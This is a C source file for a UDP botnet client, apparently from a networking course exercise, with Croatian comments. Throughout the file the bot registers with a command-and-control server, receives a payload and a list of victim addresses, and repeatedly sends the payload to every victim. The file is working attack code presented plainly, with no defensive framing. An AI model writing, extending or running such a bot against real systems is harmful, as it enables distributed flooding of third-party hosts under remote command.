#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <err.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <signal.h>
#include "pomocni.h"
#define MAXLENSERVER 512
#define MAXLENCC (1 + (INET_ADDRSTRLEN + 22) * 20)
#define BOTPORT "5555"

int mysock;

void closeSock(){
	shutdown(mysock, SHUT_RDWR);
	close(mysock);
	exit(0);
}

void usage();

void prog(char*, int, int, struct sockaddr_in*);

void startListening( char*, char*);

void rdyForAttack(int mysock, char*, struct sockaddr_in*);

void attackAll(char* buff, char* payload, int msglen, int mysock);

void attackVictim(int mysock, char* payload, char* victim_ip, char* victim_port);

int main(int argc, char *argv[])
{
	if (argc != 3) {
		usage();
	}
	
	char* ccip_addres = argv[1];
	char* ccport = argv[2];
	
	debug_printf("ccip_addres = %s\nccport = %s\n", ccip_addres, ccport);
	
	startListening(ccip_addres, ccport);
	
	return 0;
}

void usage(){
	fprintf (stderr,"%s\n", "Usage:  ./bot server_ip server_port");
    exit (1);
}
   
void startListening(char* ccip_addres, char* ccport){
	debug_printf("registering\n");
	//debug_printf("sto je INADDR_ANY: %d\n", INADDR_ANY);
    
	// addresa od cc
	struct sockaddr_in ccsa;
    createSockaddr_inFromStrings(&ccsa, ccip_addres, ccport);
    
    // napravi socket
    struct addrinfo hints, *res;
    memset(&hints, 0, sizeof hints);
    
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_DGRAM;
    hints.ai_flags = AI_PASSIVE;
    
    int error = getaddrinfo(NULL, ccport, &hints, &res);
    if (error) errx(1, "%s", gai_strerror(error));
    
    debug_printf("getaddrinfo finished\n");
	dbgPrintAddrinfo(res);
	
	mysock = Socket(res->ai_family,
		res->ai_socktype,
		res->ai_protocol);
    
    freeaddrinfo(res);
	freeaddrinfo(&hints);
	debug_printf("freed addrinfo\n");
	//mysock = Socket(AF_INET, SOCK_DGRAM, 0);
	
	// posalji REG
	char* regStr = "REG\n";
	Sendto(mysock, regStr, strlen(regStr) , 0, (struct sockaddr*)&ccsa, sizeof(ccsa));
	
	debug_printf("main(): sent: %s\n", regStr);

	char buff[MAXLENCC];
	int msglen;
	socklen_t addrlen;
	while (1){
		debug_printf("cekaj komande od cc...\n");
		
		addrlen = sizeof(ccsa);
		msglen=Recvfrom(mysock, buff, MAXLENCC, 0, (struct sockaddr *)&ccsa, &addrlen);
		buff[msglen] = 0;
		
		debug_printf("Recieved something from CC: %s\n", buff);
		debug_printf("msglen je %d\n", msglen);
		
		char command = buff[0];
		debug_printf("command je: %c\n", command);
		
		if (command == '0'){
			prog(buff, msglen, mysock, &ccsa);
		} else {
			continue;
		}
		
	}
	
	
}

void prog (char *buff, int msglen, int mysock, struct sockaddr_in *ccsa){
	debug_printf("prog()...\n");
	debug_printf("msglen je %d\n", msglen);
	
	char server_ip[INET_ADDRSTRLEN];
	strncpy(server_ip, buff + 1, INET_ADDRSTRLEN);
	
	
	debug_printf("server_ip je %s\n", server_ip);
	
	
	char server_port[22];
	strncpy(server_port, buff + INET_ADDRSTRLEN + 1, 5);
	debug_printf("server_port je %s\n", server_port);
	
	struct sockaddr_in server_sa;
	createSockaddr_inFromStrings(&server_sa, server_ip, server_port);
	
	debug_printf("sending HELLO\n");
	Sendto(mysock, "HELLO", strlen("HELLO"), 0, (struct sockaddr *)&server_sa, sizeof(server_sa));
	
	
	socklen_t addrlen;
	char server_buff[MAXLENSERVER];
	int serMesLen = Recvfrom(mysock, server_buff, MAXLENSERVER, 0, (struct sockaddr *)&server_sa, &addrlen);
	server_buff[serMesLen] = 0;
	
	debug_printf("Recieved something from server: %s\n", server_buff);
	debug_printf("serMesLen je %d\n", serMesLen);
	
	rdyForAttack(mysock, server_buff, ccsa);
}

void rdyForAttack(int mysock, char* payload, struct sockaddr_in * ccsa){
	char buff[MAXLENCC];
	int msglen;
	socklen_t addrlen;
	
	while (1){
		debug_printf("spreman za napad, cekaj komande od cc...\n");
		
		addrlen = sizeof(*ccsa);
		msglen=Recvfrom(mysock, buff, MAXLENCC, 0, (struct sockaddr *)ccsa, &addrlen);
		buff[msglen] = 0;
		
		debug_printf("Recieved something from CC: %s\n", buff);
		debug_printf("msglen je %d\n", msglen);
		
		char command = buff[0];
		debug_printf("command je: %c\n", command);
		
		if (command == '1'){
			attackAll(buff, payload, msglen, mysock);
		} else {
			prog(buff, msglen, mysock, ccsa);
		}
		
	}
}

void attackAll(char* buff, char* payload, int msglen, int mysock){
	debug_printf("attacking people at these addreses (payload = %s) %s\n", payload, buff);
	
	int pairSize = (INET_ADDRSTRLEN + 22);
	
	int num_of_pairs = (msglen - 1) / pairSize;
	debug_printf("num_of_pairs = %d\n", num_of_pairs);
	
	for (int j = 0; j < 15; j++){
		debug_printf("attack numer %d\n", j+1);
		for (int i = 0; i < num_of_pairs; i++){
			char victim_port[22];
			strncpy(victim_port, buff + 1 + (pairSize * i) + INET_ADDRSTRLEN , 5);
			debug_printf("victim_port = %s\n", victim_port);
			
			char victim_ip[INET_ADDRSTRLEN];
			strncpy(victim_ip, buff + 1 + (pairSize * i), INET_ADDRSTRLEN);
			debug_printf("victim_ip = %s\n", victim_ip);
			
			attackVictim(mysock, payload, victim_ip, victim_port);
		}
		sleep(1);
	}
}

void attackVictim(int mysock, char* payload, char* victim_ip, char* victim_port){
	debug_printf("attacking victim at %s:%s with payload %s\n", victim_ip, victim_port, payload);
	
	// napravi sockaddr za zrtvu
	struct sockaddr_in vsa;
	createSockaddr_inFromStrings(&vsa, victim_ip, victim_port);
	
	debug_printf("strlen(payload) = %d\n", strlen(payload));
	ssize_t sent = Sendto(mysock, payload, strlen(payload), 0, (struct sockaddr*)&vsa, sizeof(vsa));
	debug_printf("payload sent num of bytes sent: %d\n", sent);
}
